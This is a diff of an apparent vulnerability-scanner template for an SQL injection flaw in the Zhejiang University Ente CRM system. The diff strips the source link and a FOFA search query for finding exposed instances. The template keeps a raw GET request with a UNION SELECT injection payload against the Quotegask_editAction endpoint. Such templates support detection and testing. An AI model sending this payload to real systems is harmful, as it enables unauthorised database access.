@@ -3,14 +3,8 @@ info:
   name: 浙大恩特客户资源管理系统-Quotegask_editAction存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wc3dhx5m3gnaowzv
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wc3dhx5m3gnaowzv
-    fofa: title="欢迎使用浙大恩特客户资源管理系统" || body="script/Ent.base.js" || app="浙大恩特客户资源管理系统"
 http:
 - raw:
   - 'GET /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1'')+UNION+ALL+SELECT+111*111--+&method=goonumIsExist HTTP/1.1
